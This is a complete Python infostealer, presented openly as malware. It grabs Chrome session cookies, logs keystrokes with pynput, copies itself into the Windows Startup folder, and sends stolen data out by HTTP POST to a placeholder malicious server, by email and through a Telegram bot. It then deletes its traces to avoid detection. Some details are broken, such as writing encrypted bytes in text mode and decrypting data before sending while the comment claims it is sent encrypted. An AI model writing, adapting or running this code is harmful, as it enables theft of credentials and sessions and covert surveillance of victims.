import os
import shutil
import requests
import smtplib
import base64
import json
import sys
from cryptography.fernet import Fernet
from pynput import keyboard
import threading
import sqlite3
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# Step 1: Generate an encryption key for securely storing data
def generate_key():
    return Fernet.generate_key()

# Step 2: Encrypt and decrypt data
def encrypt_data(data, key):
    fernet = Fernet(key)
    return fernet.encrypt(data.encode())

def decrypt_data(data, key):
    fernet = Fernet(key)
    return fernet.decrypt(data).decode()

# Step 3: Steal browser session cookies (example for Chrome browser on Windows)
def steal_browser_cookies():
    # Path to Chrome's cookie file on Windows
    cookies_path = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies")
    
    if os.path.exists(cookies_path):
        # Connect to SQLite cookie database
        conn = sqlite3.connect(cookies_path)
        cursor = conn.cursor()
        
        # Extract cookies (simplified query)
        cursor.execute("SELECT name, value FROM cookies")
        cookies = cursor.fetchall()
        
        cookies_data = ""
        for cookie in cookies:
            cookies_data += f"Cookie Name: {cookie[0]}, Cookie Value: {cookie[1]}\n"
        
        # Encrypt the cookies
        encrypted_cookies = encrypt_data(cookies_data, encryption_key)
        
        # Save encrypted cookies to file
        with open("C:\\stolen_data\\cookies.enc", "w") as f:
            f.write(encrypted_cookies)

# Step 4: Exfiltrate data to a remote server
def exfiltrate_data():
    try:
        with open("C:\\stolen_data\\cookies.enc", "r") as file:
            encrypted_data = file.read()
        
        decrypted_data = decrypt_data(encrypted_data, encryption_key)
        
        # Send encrypted data to an external server (example URL)
        response = requests.post("https://yourmaliciousserver.com", data={"file": decrypted_data})
        print("Exfiltration complete, response:", response.status_code)
    except Exception as e:
        print("Error during data exfiltration:", e)

# Step 5: Simple keylogger function
def on_press(key):
    try:
        with open("C:\\stolen_data\\keylogs.txt", "a") as log:
            log.write(str(key.char))  # Log the key pressed
    except AttributeError:
        pass

def start_keylogger():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

# Step 6: Set up persistence (add script to Windows startup)
def set_persistence():
    script_location = sys.argv[0]  # Path to this script
    startup_folder = os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\")
    shutil.copy(script_location, startup_folder + "stealer_script.py")

# Step 7: Send logs via email (SMTP)
def send_email(log_file):
    try:
        with open(log_file, "r") as file:
            log_content = file.read()

        # Set up the email server and credentials
        sender_email = "youremail@example.com"
        receiver_email = "targetemail@example.com"
        password = "yourpassword"  # Use an app-specific password if necessary
        
        msg = MIMEMultipart()
        msg['From'] = sender_email
        msg['To'] = receiver_email
        msg['Subject'] = "Stolen Logs"
        
        msg.attach(MIMEText(log_content, 'plain'))
        
        # Connect to the email server and send
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(sender_email, password)
        text = msg.as_string()
        server.sendmail(sender_email, receiver_email, text)
        server.quit()
        
        print("Email sent successfully!")
    except Exception as e:
        print(f"Error sending email: {e}")

# Step 8: Send logs via Telegram (Telegram Bot API)
def send_telegram_log():
    bot_token = "yourbot_token"
    chat_id = "yourchat_id"
    try:
        with open("C:\\stolen_data\\keylogs.txt", "r") as file:
            log_content = file.read()

        # Send logs as a message to your Telegram bot
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text={log_content}"
        response = requests.get(url)
        if response.status_code == 200:
            print("Telegram message sent successfully!")
        else:
            print("Error sending Telegram message:", response.text)
    except Exception as e:
        print(f"Error sending to Telegram: {e}")

# Step 9: Clean up after execution to avoid detection
def clean_up():
    try:
        os.remove("C:\\stolen_data\\cookies.enc")
        os.remove("C:\\stolen_data\\keylogs.txt")
    except Exception as e:
        print("Error during cleanup:", e)

# Main function to control the flow
if __name__ == "__main__":
    encryption_key = generate_key()  # This should be securely stored or sent to your remote server for decryption
    
    # Start the keylogger in a separate thread
    keylogger_thread = threading.Thread(target=start_keylogger)
    keylogger_thread.daemon = True
    keylogger_thread.start()
    
    # Simulate stealing browser session cookies and exfiltration
    steal_browser_cookies()
    exfiltrate_data()
    
    # Set persistence for automatic re-execution
    set_persistence()
    
    # Send logs to email or Telegram
    send_email("C:\\stolen_data\\keylogs.txt")
    send_telegram_log()
    
    # Clean up files (to avoid detection)
    clean_up()
